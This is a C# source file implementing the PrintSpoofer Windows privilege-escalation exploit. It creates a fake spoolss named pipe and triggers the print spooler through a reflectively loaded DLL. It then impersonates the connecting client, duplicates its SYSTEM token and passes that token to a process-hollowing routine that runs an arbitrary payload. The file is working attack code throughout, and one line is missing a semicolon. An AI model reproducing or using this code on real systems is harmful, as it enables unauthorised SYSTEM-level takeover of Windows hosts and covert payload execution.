using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Net;
using System.Threading;
using RDI;

namespace PrintSpooferNet
{
    class PrintSpoofer
    {

        Thread spoolPipeThread;
        string hostName;
        string pipeName;



        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }


        // Incomplete enum, but the pinvoke stuff has values that c# complains about and I don't need
        [Flags]
        public enum PipeOpenModeFlags : uint
        {
            PIPE_ACCESS_DUPLEX = 0x00000003,
            PIPE_ACCESS_INBOUND = 0x00000001,
            PIPE_ACCESS_OUTBOUND = 0x00000002,
        }

        [Flags]
        public enum PipeModeFlags : uint
        {
            //One of the following type modes can be specified. The same type mode must be specified for each instance of the pipe.
            PIPE_TYPE_BYTE = 0x00000000,
            PIPE_TYPE_MESSAGE = 0x00000004,
            //One of the following read modes can be specified. Different instances of the same pipe can specify different read modes
            PIPE_READMODE_BYTE = 0x00000000,
            PIPE_READMODE_MESSAGE = 0x00000002,
            //One of the following wait modes can be specified. Different instances of the same pipe can specify different wait modes.
            PIPE_WAIT = 0x00000000,
            PIPE_NOWAIT = 0x00000001,
            //One of the following remote-client modes can be specified. Different instances of the same pipe can specify different remote-client modes.
            PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
            PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, PipeOpenModeFlags dwOpenMode, PipeModeFlags dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DisconnectNamedPipe(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();


        void SpoolPipeThread()
        {
            IntPtr hToken;

            string pName = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";

            IntPtr hPipe = CreateNamedPipe(pName, PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, PipeModeFlags.PIPE_TYPE_BYTE, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            Console.WriteLine(@"[+] Named pipe {0} creation returned: {1}", pipeName, hPipe);

            Console.WriteLine("[+] Connecting to named pipe");
            if (true == ConnectNamedPipe(hPipe, IntPtr.Zero)) {
                Console.WriteLine("[+] Victim connected to named pipe");
            }
            else
            {
                Console.WriteLine("FAILED");
                Environment.Exit(0);
            }
            ImpersonateNamedPipeClient(hPipe);
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"[+] Found sid {0}", sidstr);
            

            // Duplicate the token
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);


            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("[+] Impersonated user is: " + name);

            // Drop back to our normal privs
            RevertToSelf();


            Console.WriteLine("[+] Jumping to process hollowing code")
            // Go run our payload with the stolen token
            Hollow.RunPayload(hSystemToken);

            // We're done, drop the pipe
            DisconnectNamedPipe(hPipe);            
        }

        public PrintSpoofer()
        {
            hostName = Dns.GetHostName();
            pipeName = Guid.NewGuid().ToString();
            spoolPipeThread = new Thread(SpoolPipeThread);
            spoolPipeThread.Start();
        }

        public void TriggerPrintSpoofer()
        {
            string arg2 = $"{hostName}/pipe/{pipeName}";
            Console.WriteLine($"Calling DoStuff with args '\\\\{hostName}' '\\\\{arg2}'");
            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{hostName} \\\\{arg2}");

            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
        }
    }
}
